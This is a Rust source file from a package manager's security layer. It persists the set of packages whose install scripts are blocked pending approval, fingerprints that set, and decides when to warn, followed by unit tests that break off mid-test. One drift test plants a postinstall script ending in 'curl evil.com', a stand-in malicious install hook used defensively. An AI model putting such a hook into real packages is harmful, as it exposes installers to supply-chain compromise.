//! Phase 32 Phase 4 — `<project_dir>/.lpm/build-state.json` persistence layer.
//!
//! This file is the spine of the `lpm approve-builds` review flow. It captures
//! the install-time blocked set (packages with lifecycle scripts that aren't
//! covered by an existing strict approval) so:
//!
//! 1. The post-install warning ("8 packages blocked") only fires when the
//!    blocked set has CHANGED since the last install — repeated installs of
//!    the same project don't re-warn.
//! 2. `lpm approve-builds` doesn't have to re-walk the store on startup —
//!    it reads from this file directly.
//!
//! ## Location
//!
//! `<project_dir>/.lpm/build-state.json` (NOT `node_modules/.lpm/build-state.json`).
//! See **F7** in the Phase 4 status doc for the rationale: `.lpm/` next to
//! `package.json` survives `rm -rf node_modules`, matches the existing
//! `install-hash` convention, and avoids colliding with the linker's
//! pnpm-style internal store at `node_modules/.lpm/`.
//!
//! ## Schema versioning
//!
//! [`BUILD_STATE_VERSION`] is bumped on every breaking change. The reader
//! returns `None` for unknown versions (forward-compat: never read state
//! files newer than what we know how to parse).
//!
//! ## Atomic writes
//!
//! [`write_build_state`] writes to a tempfile alongside the target and
//! renames it into place. A crash mid-write leaves the previous state file
//! intact rather than producing a half-written file the reader chokes on.

use lpm_common::LpmError;
use lpm_security::{SecurityPolicy, TrustMatch, script_hash::compute_script_hash};
use lpm_store::PackageStore;
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};
use std::path::{Path, PathBuf};

/// Schema version for [`BuildState`]. Bump on breaking changes; the reader
/// rejects unknown versions to enforce forward-compat.
pub const BUILD_STATE_VERSION: u32 = 1;

/// Filename inside `<project_dir>/.lpm/`.
pub const BUILD_STATE_FILENAME: &str = "build-state.json";

/// Top-level shape of `build-state.json`.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BuildState {
    /// Bumped on every breaking change to this struct or to
    /// [`BlockedPackage`]. Readers compare against [`BUILD_STATE_VERSION`]
    /// and treat any mismatch as "no state, re-emit warning".
    pub state_version: u32,
    /// Deterministic SHA-256 over the sorted blocked-package list.
    /// Used by the install pipeline to decide whether to suppress the
    /// "N packages blocked" banner — it suppresses iff the fingerprint
    /// matches the previous run.
    pub blocked_set_fingerprint: String,
    /// RFC 3339 timestamp of when this state file was written. Used by
    /// future stale-state detection (Phase 12+) but not by Phase 4's
    /// suppression logic, which is purely fingerprint-based.
    pub captured_at: String,
    /// The packages whose lifecycle scripts were blocked at the time of
    /// the install that wrote this file. Sorted by `(name, version)` for
    /// deterministic fingerprinting.
    pub blocked_packages: Vec<BlockedPackage>,
}

/// One entry in [`BuildState::blocked_packages`].
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct BlockedPackage {
    pub name: String,
    pub version: String,
    /// SRI integrity hash from the lockfile, if known. Phase 4 binds
    /// approvals to this so a registry-side tarball swap re-opens review.
    pub integrity: Option<String>,
    /// Deterministic install-script hash from
    /// `lpm_security::script_hash::compute_script_hash`. Phase 4 binds
    /// approvals to this so any change to the executed script bytes
    /// re-opens review. May be `None` for packages whose store directory
    /// is missing or unreadable at install time (the gate fails closed —
    /// such packages stay blocked until the next install repopulates).
    pub script_hash: Option<String>,
    /// Which install phases (subset of [`lpm_security::EXECUTED_INSTALL_PHASES`])
    /// have non-empty bodies. Used by `lpm approve-builds` for human display.
    pub phases_present: Vec<String>,
    /// True if there IS an existing rich entry in `trustedDependencies`
    /// for this `name@version` but the stored binding doesn't match the
    /// current `(integrity, script_hash)`. Distinguishes "first-time
    /// blocked" from "previously approved, now drifted, needs re-review".
    pub binding_drift: bool,
}

/// Result of [`capture_blocked_set_after_install`] — exposes the new state
/// AND whether the install pipeline should emit the post-install warning.
#[derive(Debug, Clone)]
pub struct BlockedSetCapture {
    /// The fresh `BuildState` that was just persisted.
    pub state: BuildState,
    /// Fingerprint from the previous install, if a state file existed.
    /// `None` means "no previous state" (first install, or state was
    /// deleted, or version mismatch).
    pub previous_fingerprint: Option<String>,
    /// Whether the install pipeline should emit a banner. The rule:
    /// - First install ever (no previous state): true if blocked_packages non-empty
    /// - Fingerprint changed (anything different): true
    /// - All previously blocked are now approved (current empty, prev non-empty): true (positive banner)
    /// - Fingerprint unchanged: false
    /// - First install ever AND no blocked packages: false
    pub should_emit_warning: bool,
    /// True iff the warning is the "all approved!" celebration. Lets the
    /// caller render a different message than the default "N blocked".
    pub all_clear_banner: bool,
}

/// Read the build-state file from `<project_dir>/.lpm/build-state.json`.
///
/// Returns `None` if:
/// - The file is missing
/// - The file fails to parse as JSON
/// - The file's `state_version` is not [`BUILD_STATE_VERSION`]
///
/// All three failure modes are treated identically: "no previous state".
/// The caller will write a fresh state on the next install.
pub fn read_build_state(project_dir: &Path) -> Option<BuildState> {
    let path = build_state_path(project_dir);
    let content = std::fs::read_to_string(&path).ok()?;
    let state: BuildState = serde_json::from_str(&content).ok()?;
    if state.state_version != BUILD_STATE_VERSION {
        tracing::debug!(
            "build-state.json version mismatch (got {}, expected {}) — treating as missing",
            state.state_version,
            BUILD_STATE_VERSION,
        );
        return None;
    }
    Some(state)
}

/// Atomically write `state` to `<project_dir>/.lpm/build-state.json`.
///
/// Writes to a tempfile alongside the target then renames it into place.
/// A crash between the write and the rename leaves the previous state file
/// intact rather than corrupting it.
pub fn write_build_state(project_dir: &Path, state: &BuildState) -> Result<(), LpmError> {
    let lpm_dir = project_dir.join(".lpm");
    std::fs::create_dir_all(&lpm_dir).map_err(LpmError::Io)?;

    let target = build_state_path(project_dir);
    // Use a unique tempfile name (PID + nanos) so concurrent installs of
    // the same project don't clobber each other's tempfiles. The rename
    // is still the consistency boundary — last writer wins.
    let pid = std::process::id();
    let nanos = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_nanos())
        .unwrap_or(0);
    let tmp = lpm_dir.join(format!(".{BUILD_STATE_FILENAME}.{pid}.{nanos}.tmp"));

    let json = serde_json::to_string_pretty(state)
        .map_err(|e| LpmError::Registry(format!("failed to serialize build state: {e}")))?;
    std::fs::write(&tmp, format!("{json}\n")).map_err(LpmError::Io)?;
    std::fs::rename(&tmp, &target).map_err(|e| {
        // Best-effort cleanup of the tempfile if the rename failed.
        let _ = std::fs::remove_file(&tmp);
        LpmError::Io(std::io::Error::new(
            e.kind(),
            format!(
                "failed to rename build-state tempfile into place: {e} \
                 (target: {})",
                target.display()
            ),
        ))
    })?;
    Ok(())
}

/// Compute the deterministic fingerprint over a slice of blocked packages.
///
/// **Determinism contract:** the fingerprint MUST be stable across:
/// - Reorders of the input slice (sorted internally before hashing)
/// - Different operating systems
/// - Different versions of `serde_json` (we don't serialize through it)
///
/// The hash input format is one line per package, NUL-terminated:
///   `<name>@<version>|<integrity-or-empty>|<script_hash-or-empty>\x00`
/// sorted by `(name, version)` ascending. The output is `sha256-<hex>`
/// to match the script_hash format.
pub fn compute_blocked_set_fingerprint(packages: &[BlockedPackage]) -> String {
    let mut keys: Vec<String> = packages
        .iter()
        .map(|p| {
            format!(
                "{}@{}|{}|{}",
                p.name,
                p.version,
                p.integrity.as_deref().unwrap_or(""),
                p.script_hash.as_deref().unwrap_or(""),
            )
        })
        .collect();
    keys.sort();

    let mut hasher = Sha256::new();
    for key in keys {
        hasher.update(key.as_bytes());
        hasher.update([0u8]);
    }
    format!("sha256-{}", hex_lower(&hasher.finalize()))
}

/// Compute the install-time blocked set for a project.
///
/// Walks `installed`, looks at each package's lifecycle scripts via the
/// store, and includes any package whose script hash is NOT covered by
/// an existing strict approval in `policy.trusted_dependencies`.
///
/// Returns the list sorted by `(name, version)` so the caller can pass
/// it directly to [`compute_blocked_set_fingerprint`].
pub fn compute_blocked_packages(
    store: &PackageStore,
    installed: &[(String, String, Option<String>)],
    policy: &SecurityPolicy,
) -> Vec<BlockedPackage> {
    let mut blocked: Vec<BlockedPackage> = Vec::new();

    for (name, version, integrity) in installed {
        let pkg_dir = store.package_dir(name, version);

        // Compute the script hash. None means "no install-phase scripts" —
        // such a package is not blockable, skip.
        let script_hash = match compute_script_hash(&pkg_dir) {
            Some(h) => h,
            None => continue,
        };

        // What phases are present (for human display in approve-builds)?
        let phases_present = read_present_install_phases(&pkg_dir);
        if phases_present.is_empty() {
            // Defensive: compute_script_hash returned Some but we found no
            // phases. Shouldn't happen given F3, but skip rather than emit
            // a confusing entry.
            continue;
        }

        // Strict gate query. Phase 4 binds approvals to
        // (name, version, integrity, script_hash).
        let trust =
            policy.can_run_scripts_strict(name, version, integrity.as_deref(), Some(&script_hash));

        let (is_blocked, binding_drift) = match trust {
            // Strict approval covers this exact tuple — NOT blocked.
            TrustMatch::Strict => (false, false),
            // Legacy bare-name entry covers it leniently — NOT blocked
            // (the existing build pipeline will run the script with a
            // deprecation warning per M5). The blocked set is for things
            // the user must REVIEW; legacy entries are reviewable via the
            // `lpm approve-builds` upgrade path but not blocking.
            TrustMatch::LegacyNameOnly => (false, false),
            // Rich entry exists but the binding doesn't match — BLOCKED
            // and flagged as drift so approve-builds can show a special
            // "previously approved, please re-review" message.
            TrustMatch::BindingDrift { .. } => (true, true),
            // No matching entry at all — BLOCKED, first-time review.
            TrustMatch::NotTrusted => (true, false),
        };

        if is_blocked {
            blocked.push(BlockedPackage {
                name: name.clone(),
                version: version.clone(),
                integrity: integrity.clone(),
                script_hash: Some(script_hash),
                phases_present,
                binding_drift,
            });
        }
    }

    // Sort for deterministic fingerprinting.
    blocked.sort_by(|a, b| (&a.name, &a.version).cmp(&(&b.name, &b.version)));
    blocked
}

/// The end-to-end install hook: compute → compare to previous → write →
/// return whether to emit a banner.
pub fn capture_blocked_set_after_install(
    project_dir: &Path,
    store: &PackageStore,
    installed: &[(String, String, Option<String>)],
    policy: &SecurityPolicy,
) -> Result<BlockedSetCapture, LpmError> {
    let blocked = compute_blocked_packages(store, installed, policy);
    let fingerprint = compute_blocked_set_fingerprint(&blocked);

    let previous = read_build_state(project_dir);
    let previous_fingerprint = previous.as_ref().map(|p| p.blocked_set_fingerprint.clone());
    let previous_was_non_empty = previous
        .as_ref()
        .map(|p| !p.blocked_packages.is_empty())
        .unwrap_or(false);

    let fingerprint_changed = previous_fingerprint
        .as_deref()
        .map(|prev| prev != fingerprint)
        .unwrap_or(true); // no previous state → "changed" from None

    let now_empty = blocked.is_empty();

    // Decide emission:
    let (should_emit_warning, all_clear_banner) = if fingerprint_changed {
        if now_empty && previous_was_non_empty {
            // Positive case: previously had blocked entries, all now approved.
            (true, true)
        } else if now_empty {
            // First install ever AND nothing to block. Silent.
            (false, false)
        } else {
            // First install with blocks, OR new package added, OR script
            // hash drifted. Loud.
            (true, false)
        }
    } else {
        // Fingerprint unchanged: silent regardless of count.
        (false, false)
    };

    let state = BuildState {
        state_version: BUILD_STATE_VERSION,
        blocked_set_fingerprint: fingerprint,
        captured_at: current_rfc3339(),
        blocked_packages: blocked,
    };

    write_build_state(project_dir, &state)?;

    Ok(BlockedSetCapture {
        state,
        previous_fingerprint,
        should_emit_warning,
        all_clear_banner,
    })
}

/// Path helper. Centralized so any future relocation only changes one site.
pub fn build_state_path(project_dir: &Path) -> PathBuf {
    project_dir.join(".lpm").join(BUILD_STATE_FILENAME)
}

/// Read the package.json from `<store>/<safe_name>@<version>/` and return
/// the names of [`lpm_security::EXECUTED_INSTALL_PHASES`] entries that
/// are present and non-empty.
fn read_present_install_phases(pkg_dir: &Path) -> Vec<String> {
    let pkg_json_path = pkg_dir.join("package.json");
    let Ok(content) = std::fs::read_to_string(&pkg_json_path) else {
        return vec![];
    };
    let Ok(parsed) = serde_json::from_str::<serde_json::Value>(&content) else {
        return vec![];
    };
    let Some(scripts) = parsed.get("scripts").and_then(|v| v.as_object()) else {
        return vec![];
    };

    lpm_security::EXECUTED_INSTALL_PHASES
        .iter()
        .filter(|phase| {
            scripts
                .get(**phase)
                .and_then(|v| v.as_str())
                .is_some_and(|s| !s.is_empty())
        })
        .map(|s| s.to_string())
        .collect()
}

fn current_rfc3339() -> String {
    // Use `chrono` for the timestamp (already a workspace dep in lpm-cli;
    // lpm-security uses `time` but that's not depended on here).
    chrono::Utc::now().to_rfc3339()
}

fn hex_lower(bytes: &[u8]) -> String {
    const HEX: &[u8; 16] = b"0123456789abcdef";
    let mut out = String::with_capacity(bytes.len() * 2);
    for &b in bytes {
        out.push(HEX[(b >> 4) as usize] as char);
        out.push(HEX[(b & 0x0f) as usize] as char);
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use lpm_security::TrustedDependencies;
    use lpm_security::TrustedDependencyBinding;
    use std::collections::HashMap;
    use std::fs;
    use tempfile::tempdir;

    fn make_blocked(
        name: &str,
        version: &str,
        integrity: Option<&str>,
        script_hash: Option<&str>,
    ) -> BlockedPackage {
        BlockedPackage {
            name: name.to_string(),
            version: version.to_string(),
            integrity: integrity.map(String::from),
            script_hash: script_hash.map(String::from),
            phases_present: vec!["postinstall".to_string()],
            binding_drift: false,
        }
    }

    fn make_state(packages: Vec<BlockedPackage>) -> BuildState {
        let fingerprint = compute_blocked_set_fingerprint(&packages);
        BuildState {
            state_version: BUILD_STATE_VERSION,
            blocked_set_fingerprint: fingerprint,
            captured_at: "2026-04-11T00:00:00Z".to_string(),
            blocked_packages: packages,
        }
    }

    // ── BuildState round-trip ────────────────────────────────────────

    #[test]
    fn build_state_round_trips_through_serde() {
        let original = make_state(vec![
            make_blocked("esbuild", "0.25.1", Some("sha512-x"), Some("sha256-y")),
            make_blocked("sharp", "0.33.0", None, Some("sha256-z")),
        ]);
        let json = serde_json::to_string_pretty(&original).unwrap();
        let parsed: BuildState = serde_json::from_str(&json).unwrap();
        assert_eq!(parsed.state_version, original.state_version);
        assert_eq!(
            parsed.blocked_set_fingerprint,
            original.blocked_set_fingerprint
        );
        assert_eq!(parsed.blocked_packages, original.blocked_packages);
    }

    #[test]
    fn build_state_version_field_is_present_and_versioned() {
        let state = make_state(vec![]);
        assert_eq!(state.state_version, BUILD_STATE_VERSION);
        // Const assert: schema version must be at least 1 (compile-time check)
        const _: () = assert!(BUILD_STATE_VERSION > 0);
    }

    // ── read_build_state ─────────────────────────────────────────────

    #[test]
    fn read_build_state_returns_none_when_file_missing() {
        let dir = tempdir().unwrap();
        assert!(read_build_state(dir.path()).is_none());
    }

    #[test]
    fn read_build_state_returns_none_when_file_corrupt() {
        let dir = tempdir().unwrap();
        fs::create_dir_all(dir.path().join(".lpm")).unwrap();
        fs::write(
            dir.path().join(".lpm").join(BUILD_STATE_FILENAME),
            "{not valid json",
        )
        .unwrap();
        assert!(read_build_state(dir.path()).is_none());
    }

    #[test]
    fn read_build_state_returns_none_when_state_version_mismatch() {
        let dir = tempdir().unwrap();
        let mut state = make_state(vec![make_blocked("x", "1.0.0", None, None)]);
        state.state_version = 9999; // forward-compat: never read newer
        fs::create_dir_all(dir.path().join(".lpm")).unwrap();
        fs::write(
            dir.path().join(".lpm").join(BUILD_STATE_FILENAME),
            serde_json::to_string(&state).unwrap(),
        )
        .unwrap();
        assert!(read_build_state(dir.path()).is_none());
    }

    #[test]
    fn read_build_state_returns_some_for_valid_file() {
        let dir = tempdir().unwrap();
        let original = make_state(vec![make_blocked(
            "esbuild",
            "0.25.1",
            Some("sha512-x"),
            Some("sha256-y"),
        )]);
        write_build_state(dir.path(), &original).unwrap();
        let recovered = read_build_state(dir.path()).expect("must read back");
        assert_eq!(recovered.state_version, original.state_version);
        assert_eq!(recovered.blocked_packages.len(), 1);
    }

    // ── write_build_state ────────────────────────────────────────────

    #[test]
    fn write_build_state_creates_lpm_dir_if_missing() {
        let dir = tempdir().unwrap();
        // No .lpm/ exists yet
        assert!(!dir.path().join(".lpm").exists());
        write_build_state(dir.path(), &make_state(vec![])).unwrap();
        assert!(dir.path().join(".lpm").join(BUILD_STATE_FILENAME).exists());
    }

    #[test]
    fn write_build_state_atomic_write_via_temp_file_rename() {
        // Verify the temp file is gone after a successful write — i.e.,
        // the rename happened. We can't easily simulate a crash mid-write
        // in a unit test, but we CAN assert that the temp file artifact
        // isn't left behind on the happy path.
        let dir = tempdir().unwrap();
        write_build_state(dir.path(), &make_state(vec![])).unwrap();

        let lpm_dir = dir.path().join(".lpm");
        let entries: Vec<_> = std::fs::read_dir(&lpm_dir).unwrap().collect();
        // Only the final file should remain — no `.tmp` artifacts
        for entry in entries {
            let name = entry.unwrap().file_name();
            let name_str = name.to_string_lossy();
            assert!(!name_str.ends_with(".tmp"), "temp file leaked: {name_str}");
        }
    }

    #[test]
    fn write_then_read_round_trip_preserves_all_fields() {
        let dir = tempdir().unwrap();
        let original = make_state(vec![BlockedPackage {
            name: "esbuild".into(),
            version: "0.25.1".into(),
            integrity: Some("sha512-foo".into()),
            script_hash: Some("sha256-bar".into()),
            phases_present: vec!["preinstall".into(), "postinstall".into()],
            binding_drift: true,
        }]);
        write_build_state(dir.path(), &original).unwrap();
        let recovered = read_build_state(dir.path()).unwrap();
        assert_eq!(recovered.blocked_packages, original.blocked_packages);
    }

    // ── compute_blocked_set_fingerprint ──────────────────────────────

    #[test]
    fn compute_blocked_set_fingerprint_is_deterministic_across_input_order() {
        let a = vec![
            make_blocked("esbuild", "0.25.1", Some("sha512-x"), Some("sha256-y")),
            make_blocked("sharp", "0.33.0", None, Some("sha256-z")),
        ];
        let b = vec![
            make_blocked("sharp", "0.33.0", None, Some("sha256-z")),
            make_blocked("esbuild", "0.25.1", Some("sha512-x"), Some("sha256-y")),
        ];
        assert_eq!(
            compute_blocked_set_fingerprint(&a),
            compute_blocked_set_fingerprint(&b),
            "fingerprint must be invariant under input reorder"
        );
    }

    #[test]
    fn compute_blocked_set_fingerprint_changes_on_name_change() {
        let a = vec![make_blocked("esbuild", "0.25.1", None, Some("sha256-x"))];
        let b = vec![make_blocked("sharp", "0.25.1", None, Some("sha256-x"))];
        assert_ne!(
            compute_blocked_set_fingerprint(&a),
            compute_blocked_set_fingerprint(&b),
        );
    }

    #[test]
    fn compute_blocked_set_fingerprint_changes_on_version_change() {
        let a = vec![make_blocked("esbuild", "0.25.1", None, Some("sha256-x"))];
        let b = vec![make_blocked("esbuild", "0.25.2", None, Some("sha256-x"))];
        assert_ne!(
            compute_blocked_set_fingerprint(&a),
            compute_blocked_set_fingerprint(&b),
        );
    }

    #[test]
    fn compute_blocked_set_fingerprint_changes_on_script_hash_change() {
        let a = vec![make_blocked("esbuild", "0.25.1", None, Some("sha256-old"))];
        let b = vec![make_blocked("esbuild", "0.25.1", None, Some("sha256-new"))];
        assert_ne!(
            compute_blocked_set_fingerprint(&a),
            compute_blocked_set_fingerprint(&b),
        );
    }

    #[test]
    fn compute_blocked_set_fingerprint_changes_on_integrity_change() {
        let a = vec![make_blocked(
            "esbuild",
            "0.25.1",
            Some("sha512-old"),
            Some("sha256-x"),
        )];
        let b = vec![make_blocked(
            "esbuild",
            "0.25.1",
            Some("sha512-new"),
            Some("sha256-x"),
        )];
        assert_ne!(
            compute_blocked_set_fingerprint(&a),
            compute_blocked_set_fingerprint(&b),
        );
    }

    #[test]
    fn compute_blocked_set_fingerprint_changes_when_package_added() {
        let a = vec![make_blocked("esbuild", "0.25.1", None, Some("sha256-x"))];
        let b = vec![
            make_blocked("esbuild", "0.25.1", None, Some("sha256-x")),
            make_blocked("sharp", "0.33.0", None, Some("sha256-z")),
        ];
        assert_ne!(
            compute_blocked_set_fingerprint(&a),
            compute_blocked_set_fingerprint(&b),
        );
    }

    #[test]
    fn compute_blocked_set_fingerprint_empty_set_is_stable() {
        let f1 = compute_blocked_set_fingerprint(&[]);
        let f2 = compute_blocked_set_fingerprint(&[]);
        assert_eq!(f1, f2);
        assert!(f1.starts_with("sha256-"));
    }

    #[test]
    fn compute_blocked_set_fingerprint_format_starts_with_sha256_prefix() {
        let f =
            compute_blocked_set_fingerprint(&[make_blocked("x", "1.0.0", None, Some("sha256-y"))]);
        assert!(f.starts_with("sha256-"));
        assert_eq!(f.len(), 71);
    }

    // ── capture_blocked_set_after_install (suppression rule) ──────────
    //
    // These tests construct a synthetic `installed` slice and a fake
    // store directory. The store has to contain a `package.json` with
    // lifecycle scripts so `compute_script_hash` returns Some.

    fn fake_store_with_pkg(
        store_root: &Path,
        name: &str,
        version: &str,
        scripts: &serde_json::Value,
    ) {
        // Mirror PackageStore::package_dir layout: <store_root>/v1/<safe_name>@<version>/
        let safe = name.replace('/', "+");
        let pkg_dir = store_root.join("v1").join(format!("{safe}@{version}"));
        fs::create_dir_all(&pkg_dir).unwrap();
        let pkg = serde_json::json!({
            "name": name,
            "version": version,
            "scripts": scripts,
        });
        fs::write(
            pkg_dir.join("package.json"),
            serde_json::to_string_pretty(&pkg).unwrap(),
        )
        .unwrap();
    }

    fn fake_store_at(store_root: &Path) -> PackageStore {
        // PackageStore::at(root) is the test constructor that creates a
        // store at an arbitrary path with the standard v1 layout under it.
        PackageStore::at(store_root.to_path_buf())
    }

    fn empty_policy() -> SecurityPolicy {
        SecurityPolicy::default_policy()
    }

    fn rich_policy(
        name: &str,
        version: &str,
        integrity: Option<&str>,
        script_hash: Option<&str>,
    ) -> SecurityPolicy {
        let mut map = HashMap::new();
        map.insert(
            format!("{name}@{version}"),
            TrustedDependencyBinding {
                integrity: integrity.map(String::from),
                script_hash: script_hash.map(String::from),
            },
        );
        SecurityPolicy {
            trusted_dependencies: TrustedDependencies::Rich(map),
            minimum_release_age_secs: 0,
        }
    }

    #[test]
    fn capture_emits_warning_on_first_install_with_blocked_packages() {
        let project = tempdir().unwrap();
        let store_root = tempdir().unwrap();
        fake_store_with_pkg(
            store_root.path(),
            "esbuild",
            "0.25.1",
            &serde_json::json!({"postinstall": "node install.js"}),
        );
        let store = fake_store_at(store_root.path());

        let installed = vec![(
            "esbuild".to_string(),
            "0.25.1".to_string(),
            Some("sha512-x".to_string()),
        )];
        let capture =
            capture_blocked_set_after_install(project.path(), &store, &installed, &empty_policy())
                .unwrap();

        assert!(capture.should_emit_warning);
        assert!(!capture.all_clear_banner);
        assert!(capture.previous_fingerprint.is_none());
        assert_eq!(capture.state.blocked_packages.len(), 1);
        assert_eq!(capture.state.blocked_packages[0].name, "esbuild");
    }

    #[test]
    fn capture_silent_on_first_install_with_no_scriptable_packages() {
        let project = tempdir().unwrap();
        let store_root = tempdir().unwrap();
        let store = fake_store_at(store_root.path());

        // Empty installed list — nothing to block
        let capture =
            capture_blocked_set_after_install(project.path(), &store, &[], &empty_policy())
                .unwrap();
        assert!(!capture.should_emit_warning);
        assert!(capture.state.blocked_packages.is_empty());
    }

    #[test]
    fn capture_silent_when_repeating_install_with_unchanged_blocked_set() {
        let project = tempdir().unwrap();
        let store_root = tempdir().unwrap();
        fake_store_with_pkg(
            store_root.path(),
            "esbuild",
            "0.25.1",
            &serde_json::json!({"postinstall": "node install.js"}),
        );
        let store = fake_store_at(store_root.path());

        let installed = vec![(
            "esbuild".to_string(),
            "0.25.1".to_string(),
            Some("sha512-x".to_string()),
        )];

        // First install: emits
        let cap1 =
            capture_blocked_set_after_install(project.path(), &store, &installed, &empty_policy())
                .unwrap();
        assert!(cap1.should_emit_warning);

        // Second install with the SAME blocked set: silent
        let cap2 =
            capture_blocked_set_after_install(project.path(), &store, &installed, &empty_policy())
                .unwrap();
        assert!(
            !cap2.should_emit_warning,
            "second install with unchanged blocked set must NOT re-warn"
        );
        assert_eq!(
            cap1.state.blocked_set_fingerprint,
            cap2.state.blocked_set_fingerprint
        );
    }

    #[test]
    fn capture_re_emits_when_new_package_added_to_blocked_set() {
        let project = tempdir().unwrap();
        let store_root = tempdir().unwrap();
        fake_store_with_pkg(
            store_root.path(),
            "esbuild",
            "0.25.1",
            &serde_json::json!({"postinstall": "node install.js"}),
        );
        fake_store_with_pkg(
            store_root.path(),
            "sharp",
            "0.33.0",
            &serde_json::json!({"install": "node-gyp rebuild"}),
        );
        let store = fake_store_at(store_root.path());

        // First install: only esbuild
        let cap1 = capture_blocked_set_after_install(
            project.path(),
            &store,
            &[("esbuild".to_string(), "0.25.1".to_string(), None)],
            &empty_policy(),
        )
        .unwrap();
        assert!(cap1.should_emit_warning);

        // Second install: esbuild + sharp
        let cap2 = capture_blocked_set_after_install(
            project.path(),
            &store,
            &[
                ("esbuild".to_string(), "0.25.1".to_string(), None),
                ("sharp".to_string(), "0.33.0".to_string(), None),
            ],
            &empty_policy(),
        )
        .unwrap();
        assert!(
            cap2.should_emit_warning,
            "adding a new blocked package must re-emit"
        );
        assert_ne!(
            cap1.state.blocked_set_fingerprint,
            cap2.state.blocked_set_fingerprint
        );
    }

    #[test]
    fn capture_re_emits_when_script_hash_drifts_for_existing_package() {
        let project = tempdir().unwrap();
        let store_root = tempdir().unwrap();

        // Initial install with one script body
        fake_store_with_pkg(
            store_root.path(),
            "esbuild",
            "0.25.1",
            &serde_json::json!({"postinstall": "node install.js"}),
        );
        let store = fake_store_at(store_root.path());
        let installed = vec![("esbuild".to_string(), "0.25.1".to_string(), None)];
        let cap1 =
            capture_blocked_set_after_install(project.path(), &store, &installed, &empty_policy())
                .unwrap();
        assert!(cap1.should_emit_warning);

        // Mutate the package.json in the store to drift the script hash
        fake_store_with_pkg(
            store_root.path(),
            "esbuild",
            "0.25.1",
            &serde_json::json!({"postinstall": "node install.js && curl evil.com"}),
        );

        let cap2 =
            capture_blocked_set_after_install(project.path(), &store, &installed, &empty_policy())
                .unwrap();
        assert!(cap2.should_emit_warning, "script hash drift must re-emit");
        assert_ne!(
            cap1.state.blocked_set_fingerprint,
            cap2.state.blocked_set_fingerprint
        );
    }

    #[test]
    fn capture_emits_positive_clear_banner_when_all_previously_blocked_now_approved() {
        let project = tempdir().unwrap();
        let store_root = tempdir().unwrap();
        fake_store_with_pkg(
            store_root.path(),
            "esbuild",
            "0.25.1",
            &serde_json::json!({"postinstall": "node install.js"}),
        );
        let store = fake_store_at(store_root.path());

        // First install with empty policy → blocked
        let installed = vec![(
            "esbuild".to_string(),
            "0.25.1".to_string(),
            Some("sha512-x".to_string()),
        )];
        let cap1 =
            capture_blocked_set_after_install(project.path(), &store, &installed, &empty_policy())
                .unwrap();
        assert!(cap1.should_emit_warning);
        assert!(!cap1.all_clear_banner);
        let captured_script_hash = cap1.state.blocked_packages[0].script_hash.clone().unwrap();

        // Second install with a policy that approves esbuild (we use the
        // captured script_hash from cap1 so the binding matches)
        let policy = rich_policy(
            "esbuild",
            "0.25.1",
            Some("sha512-x"),
            Some(&captured_script_hash),
        );
        let cap2 =
            capture_blocked_set_after_install(project.path(), &store, &installed, &policy).unwrap();
        assert!(cap2.should_emit_warning);
        assert!(
            cap2.all_clear_banner,
            "transition from blocked → all approved must surface as positive banner"
        );
        assert!(cap2.state.blocked_packages.is_empty());

        // Third install with the same policy → silent (no positive banner spam)
        let cap3 =
            capture_blocked_set_after_install(project.path(), &store, &installed, &policy).unwrap();
        assert!(
            !cap3.should_emit_warning,
            "after the all-clear banner, repeated installs are silent"
        );
    }

    #[test]
    fn capture_marks_drifted_packages_with_binding_drift_flag() {
        let project = tempdir().unwrap();
        let store_root = tempdir().unwrap();
        fake_store_with_pkg(
            store_root.path(),
            "esbuild",
            "0.25.1",
            &serde_json::json!({"postinstall": "node install.js"}),
        );
        let store = fake_store_at(store_root.path());

        // Policy approves esbuild but with a STALE script hash → drift
        let policy = rich_policy("esbuild", "0.25.1", Some("sha512-x"), Some("sha256-stale"));
        let installed = vec![(
            "esbuild".to_string(),
            "0.25.1".to_string(),
            Some("sha512-x".to_string()),
        )];
        let capture =
            capture_blocked_set_after_install(project.path(), &store, &installed, &policy).unwrap();

        assert!(capture.should_emit_warning);
        assert_eq!(capture.state.blocked_packages.len(), 1);
        assert!(
            capture.state.blocked_packages[0].binding_drift,
            "drifted approval must be flagged"
        );
    }

    #[test]
    fn capture_skips_packages_with_no_install_phases() {
        let project = tempdir().unwrap();
        let store_root = tempdir().unwrap();
        fake_store_with_pkg(
            store_root.path(),
            "tsc",
            "5.0.0",
            // build/test ARE in the package.json but NOT in EXECUTED_INSTALL_PHASES
            &serde_json::json!({"build": "tsc", "test": "vitest"}),
        );
        let store = fake_store_at(store_root.path());

        let capture = capture_blocked_set_after_install(
            project.path(),
            &store,
            &[("tsc".to_string(), "5.0.0".to_string(), None)],
            &empty_policy(),
        )
        .unwrap();
        assert!(capture.state.blocked_packages.is_empty());
        assert!(!capture.should_emit_warning);
    }

    #[test]
    fn capture_legacy_name_only_approval_does_not_block() {
        let project = tempdir().unwrap();
        let store_root = tempdir().unwrap();
        fake_store_with_pkg(
            store_root.path(),
            "esbuild",
            "0.25.1",
            &serde_json::json!({"postinstall": "node install.js"}),
        );
        let store = fake_store_at(store_root.path());

        // Legacy bare-name entry — covers esbuild leniently
        let policy = SecurityPolicy {
            trusted_dependencies: TrustedDependencies::Legacy(vec!["esbuild".to_string()]),
            minimum_release_age_secs: 0,
        };

        let capture = capture_blocked_set_after_install(
            project.path(),
            &store,
            &[("esbuild".to_string(), "0.25.1".to_string(), None)],
            &policy,
        )
        .unwrap();

        // Legacy approval is enough to NOT block (M5 will run the script
        // with a deprecation warning). The blocked set is for things the
        // user must REVIEW.
        assert!(capture.state.blocked_packages.is_empty());
        assert!(!capture.should_emit_warning);
    }

    #[test]
    fn capture_writes_state_file_on_every_call_even_when_silent() {
        let project = tempdir().unwrap();
        let store_root = tempdir().unwrap();
        let store = fake_store_at(store_root.path());

        // First call: silent (no installed packages), but state file written
        let cap1 = capture_blocked_set_after_install(project.path(), &store, &[], &empty_policy())
            .unwrap();
        assert!(!cap1.should_emit_warning);
        assert!(read_build_state(project.path()).is_some());

        // Captured_at is updated even if fingerprint is unchanged
        let captured_at_1 = read_build_state(project.path()).unwrap().captured_at;

        std::thread::sleep(std::time::Duration::from_millis(1100));

        let _ = capture_blocked_set_after_install(project.path(), &store, &[], &empty_policy())
            .unwrap();
        let captured_at_2 = read_build_state(project.path()).unwrap().captured_at;
